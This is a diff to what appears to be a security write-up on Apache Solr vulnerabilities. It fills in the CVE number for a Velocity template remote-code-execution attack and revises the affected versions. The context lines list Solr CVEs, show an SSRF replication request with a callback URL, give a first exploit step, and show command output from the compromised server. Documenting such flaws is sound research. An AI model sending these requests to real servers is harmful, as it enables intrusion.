@@ -15,7 +15,7 @@
   * [[CVE-2012-6612, CVE-2013-6407, CVE-2013-6408] XXE in the Update Handler](#4-cve-2012-6612-cve-2013-6407-cve-2013-6408-xxe-in-the-update-handler)
   * [[CVE-2013-6397] Remote Code execution via XSLT response writer and path traversal](#5-cve-2013-6397-remote-code-execution-via-xslt-response-writer-and-path-traversal)
   * [[CVE-2017-3163] Arbitrary file read via path traversal attack in ReplicationHandler](#6-cve-2017-3163-arbitrary-file-read-via-path-traversal-attack-in-replicationhandler)
-  * [[CVE-2019-XXXX] RCE via Velocity template by @_S00pY](#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py)
+  * [[CVE-2019-17558] RCE via Velocity template by @_S00pY](#7-cve-2019-xxxx-rce-via-velocity-template-by-_s00py)
 * [Black box detection](#black-box-detection)
 * [Conclusion](#conclusion)
 
@@ -387,8 +387,8 @@ There is also an unfixed SSRF here, but with the existence of "shards" feature i
 `GET /solr/db/replication?command=fetchindex&masterUrl=http://callback/xxxx&wt=json&httpBasicAuthUser=aaa&httpBasicAuthPassword=bbb`
 
 
-### 7. \[CVE-2019-XXXX] RCE via Velocity template by @_S00pY
-**Target Solr version**: >5? (not sure when config API is introduced) - latest (tested on 8.2.0)<br>
+### 7. \[CVE-2019-17558] RCE via Velocity template by @_S00pY
+**Target Solr version**: 5.0 - 8.3 <br>
 **Requirements:** none
 
 Step 1: Set "params.resource.loader.enabled" as true for the current collection via config API.
@@ -420,7 +420,7 @@ HTTP/1.1 200 OK
 Content-Type: text/html;charset=utf-8
 Content-Length: 56
 
-     0  uid=8983(solr) gid=8983(solr) groups=8983(solr)
+0  uid=8983(solr) gid=8983(solr) groups=8983(solr)
 ```
 
 See https://gist.githubusercontent.com/s00py/a1ba36a3689fa13759ff910e179fc133/raw/fae5e663ffac0e3996fd9dbb89438310719d347a/gistfile1.txt
